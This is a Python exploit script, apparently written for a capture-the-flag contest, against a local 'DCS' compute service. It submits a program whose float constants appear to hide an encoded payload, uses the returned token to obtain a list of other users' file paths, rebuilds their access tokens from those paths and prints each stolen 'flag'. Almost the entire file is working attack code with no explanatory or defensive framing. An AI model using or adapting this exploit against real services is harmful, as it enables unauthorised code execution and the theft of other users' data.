import json
import requests

code = '''
a3b5c = 9.01665960969080694903108994646e-308;
a3b5d = 5.89900095836992470543979457601e-308;
a3b5e = 2.94950047918496235271989728801e-308;
a3b5f = -1.13962551584212620632980908507e-244;
a3b5g = -11920.0000000047675712266936898;
a3b5h = 1.28326448731251798597851684744e-78;
a3b5i = 6.29284709594975605135792094167e-92;
a3b5j = 2.1971303441320653080330698334e-152;
a3b5k = 3.87546157797830208220587864688e-80;
a3b5l = 2.86530687399045625656107066942e+161;
a3b5m = 5.38409467802000282671150077615e+241;
a3b5n = 3.11888437715206740075614361764e+161;
a3b5o = 1.41894014867253636496431508459e+161;
a3b5p = 4.39558737237486546973012633094e+252;
a3b5q = 5.52559648449915692702815701664e+257;
a3b5r = 3.4653160729132520229722030536e+185;
a3b5s = 1.29503525642399536129001394637e+171;
a3b5t = 8.25971437589206984708987682454e-154;
a3b5u = 3.11888436252934216500734194682e+161;
a3b5v = 1.41894014867253636496431508459e+161;
a3b5w = 4.27255621593463064889140018959e+180;
a3b5x = 3.11888404154024059066604380509e+161;
a3b5y = 1.41894014867253636496431508459e+161;
a3b5z = 4.39558737237486546973012633094e+252;
a3b6a = 5.52559648449915692702815701664e+257;
a3b6b = 3.4653160729132520229722030536e+185;
a3b6c = 1.29503525642399536129001394637e+171;
a3b6d = 8.25971437589206984708987682454e-154;
a3b6e = 3.17556682638780341692405072892e-120;
a3b6f = 7.43083922896928744450392564933e-120;
a3b6g = 9.31476625042255462280623371223e+242;
a3b6h = 3.98455339352822777031486764751e+252;
a3b6i = 3.46513456246328025214221041058e+185;
a3b6j = 1.29503525642399536129001394637e+171;
a3b6k = 1.19782304862903820345902151854e+243;
a3b6l = 4.45822432662471531958872096101e+252;
a3b6m = 3.80282228790878296803396164557e-317;
a3b6n = -6.82852348231868590359212812058e-229;


fun main() {
    if (a3b6k < a3b6m) {
        return a3b6m;
    }
}
'''

with requests.post('http://localhost:7654/api/compute', json={'description': 'PWNED', 'code': code}) as r:
    print(r, r.content)
    assert(r.status_code == 201)
    token = r.headers['X-DCS-Token']

with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': token}) as r:
    print(r, r.content)
    assert(r.status_code == 200)

with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': 'ructfructfructfructfructfructfru'}) as r:
    print(r, r.content)
    assert(r.status_code == 200)

    paths = json.loads(r.content.decode('utf-8'))["description"]
    def get_token_from_path(p):
        l = p.split('/')
        if len(l) < 2:
            return ''
        return l[-2] + l[-1]
    victim_tokens = list(map(get_token_from_path, paths.split('\n')))

for t in victim_tokens:
    if t == '':
        continue

    with requests.get('http://localhost:7654/api/compute', headers={'X-DCS-Token': t}) as r:
        assert(r.status_code == 200)

        f = json.loads(r.content.decode('utf-8'))["description"]
        print(f"stealed flag: {f}")
